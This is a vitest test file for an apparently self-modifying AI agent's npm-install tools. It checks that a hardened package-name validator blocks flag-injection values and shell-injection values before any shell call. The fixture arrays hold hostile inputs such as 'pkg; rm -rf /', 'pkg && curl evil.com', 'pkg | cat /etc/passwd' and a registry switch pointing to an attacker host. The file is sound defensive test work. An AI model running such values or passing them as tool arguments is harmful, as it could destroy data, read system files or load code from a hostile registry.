/**
 * Phase 16A — npm package-name hardening (R-16).
 *
 * `install_npm_package`, `install_mcp_server` and `installNpmPackage()` all build the
 * shell command `npm install -g ${pkg}`. The previous validator, /^[@a-zA-Z0-9._/-]+$/,
 * blocked every shell metacharacter but still admitted a value beginning with `-`, which
 * npm's parser consumes as a *switch* instead of a package name.
 *
 * Measured on this host with npm 10.9.9 (2026-11-01): `npm install -g -forgery` leaves no
 * positional package, so npm installs the *current working directory* — the probe linked
 * the whole Conway project into the pinned Node runtime as a global junction, since
 * unlinked and verified reverted. Unknown switches are not rejected either.
 *
 * The same permissive pattern existed in four places. These tests pin one source of truth.
 */

import { describe, it, expect } from "vitest";
import {
  createValidationRules,
  isValidPackageName,
  PACKAGE_NAME_RE,
} from "../../agent/policy-rules/validation.js";
import { createBuiltinTools } from "../../agent/tools.js";
import { installNpmPackage } from "../../self-mod/tools-manager.js";
import type { PolicyRequest, AutomatonTool, ToolContext } from "../../types.js";

const LEGACY_RE = /^[@a-zA-Z0-9._/-]+$/;

function makeRequest(
  toolName: string,
  args: Record<string, unknown>,
  category = "self_mod",
): PolicyRequest {
  const tool = {
    name: toolName,
    description: "test",
    category: category as never,
    riskLevel: "dangerous",
    parameters: { type: "object", properties: {} },
    execute: async () => "ok",
  } as AutomatonTool;
  return {
    tool,
    args,
    context: {} as ToolContext,
    turnContext: { inputSource: "agent", turnToolCallCount: 0, sessionSpend: null as never },
  };
}

const FLAG_INJECTION = [
  "--userconfig=/tmp/evil",
  "-forgery",
  "--foreground-scripts",
  "--registry=http://attacker.invalid",
  "-@scope/pkg",
];

/**
 * The subset the previous pattern actually admitted, because every character is inside
 * its class. Payloads containing `=` or a space were already rejected, so value-bearing
 * switches were never reachable; they stay in FLAG_INJECTION only to pin that they
 * remain rejected.
 */
const LEGACY_BYPASS = ["-forgery", "--foreground-scripts", "-@scope/pkg"];

const VALID = [
  "express",
  "@scope/pkg",
  "my-package",
  "pkg.js",
  "underscore_pkg",
  "@scope/my-package",
];

const SHELL_METACHARACTER = [
  "pkg; rm -rf /",
  "pkg && curl evil.com",
  "pkg | cat /etc/passwd",
  "$(evil)",
  "`evil`",
];

describe("isValidPackageName — single source of truth", () => {
  it("accepts every name the legacy validator accepted and npm accepts", () => {
    for (const pkg of VALID) {
      expect(isValidPackageName(pkg), pkg).toBe(true);
    }
  });

  it("rejects npm flag-injection payloads", () => {
    for (const pkg of FLAG_INJECTION) {
      expect(isValidPackageName(pkg), pkg).toBe(false);
    }
  });

  it("closes the payload shape the legacy pattern admitted", () => {
    for (const pkg of LEGACY_BYPASS) {
      // Non-vacuity: each payload must have passed the pattern being replaced,
      // otherwise this test would pass without proving anything.
      expect(LEGACY_RE.test(pkg), `legacy should have accepted ${pkg}`).toBe(true);
      expect(isValidPackageName(pkg), pkg).toBe(false);
    }
  });

  it("still rejects shell metacharacters", () => {
    for (const pkg of SHELL_METACHARACTER) {
      expect(isValidPackageName(pkg), pkg).toBe(false);
    }
  });

  it("rejects empty and whitespace-only input", () => {
    expect(isValidPackageName("")).toBe(false);
    expect(isValidPackageName(" ")).toBe(false);
  });

  it("the exported regex is the one the validator uses", () => {
    for (const pkg of [...VALID, ...FLAG_INJECTION, ...SHELL_METACHARACTER]) {
      expect(PACKAGE_NAME_RE.test(pkg)).toBe(isValidPackageName(pkg));
    }
  });
});

describe("validate.package_name rule", () => {
  const rule = createValidationRules().find((r) => r.id === "validate.package_name")!;

  it("denies flag-injection payloads", () => {
    for (const pkg of FLAG_INJECTION) {
      const result = rule.evaluate(makeRequest("install_npm_package", { package: pkg }));
      expect(result, pkg).not.toBeNull();
      expect(result!.action).toBe("deny");
      expect(result!.reasonCode).toBe("VALIDATION_FAILED");
    }
  });

  it("allows the established valid names", () => {
    for (const pkg of VALID) {
      expect(rule.evaluate(makeRequest("install_npm_package", { package: pkg })), pkg).toBeNull();
    }
  });

  it("still returns null when the package arg is absent", () => {
    expect(rule.evaluate(makeRequest("install_npm_package", {}))).toBeNull();
  });
});

describe("install_npm_package / install_mcp_server never reach npm with a flag", () => {
  const tools = createBuiltinTools("phase16-test-sandbox");
  const npmTool = tools.find((t) => t.name === "install_npm_package")!;
  const mcpTool = tools.find((t) => t.name === "install_mcp_server")!;

  function stubContext(calls: string[]): ToolContext {
    return {
      conway: {
        exec: async (command: string) => {
          calls.push(command);
          return { exitCode: 0, stdout: "", stderr: "" };
        },
      },
      db: {
        insertModification: () => undefined,
        installTool: () => undefined,
      },
    } as unknown as ToolContext;
  }

  it("both tools exist", () => {
    expect(npmTool).toBeDefined();
    expect(mcpTool).toBeDefined();
  });

  it("blocks every flag-injection payload before exec", async () => {
    for (const tool of [npmTool, mcpTool]) {
      for (const pkg of FLAG_INJECTION) {
        const calls: string[] = [];
        const args: Record<string, unknown> = { package: pkg };
        if (tool.name === "install_mcp_server") args.name = "test-server";
        const result = await tool.execute(args, stubContext(calls));
        expect(String(result), `${tool.name} ${pkg}`).toContain("Blocked:");
        expect(calls, `${tool.name} must not shell out for ${pkg}`).toEqual([]);
      }
    }
  });

  it("positive control: a valid name does reach npm, unmodified", async () => {
    const calls: string[] = [];
    const result = await npmTool.execute({ package: "express" }, stubContext(calls));
    expect(calls).toEqual(["npm install -g express"]);
    expect(String(result)).toBe("Installed: express");
  });

  it("positive control: install_mcp_server reaches npm for a valid name", async () => {
    const calls: string[] = [];
    await mcpTool.execute({ name: "test-server", package: "@scope/pkg" }, stubContext(calls));
    expect(calls).toEqual(["npm install -g @scope/pkg"]);
  });
});

describe("installNpmPackage (self-mod/tools-manager) uses the same validator", () => {
  function stubConway(calls: string[]) {
    return {
      exec: async (command: string) => {
        calls.push(command);
        return { exitCode: 0, stdout: "", stderr: "" };
      },
    } as never;
  }
  const dbStub = {
    installTool: () => undefined,
    insertModification: () => undefined,
  } as never;

  it("rejects flag-injection payloads without shelling out", async () => {
    for (const pkg of FLAG_INJECTION) {
      const calls: string[] = [];
      const result = await installNpmPackage(stubConway(calls), dbStub, pkg);
      expect(result.success, pkg).toBe(false);
      expect(calls, pkg).toEqual([]);
    }
  });

  it("positive control: a valid name installs", async () => {
    const calls: string[] = [];
    const result = await installNpmPackage(stubConway(calls), dbStub, "my-package");
    expect(result.success).toBe(true);
    expect(calls).toEqual(["npm install -g my-package"]);
  });
});
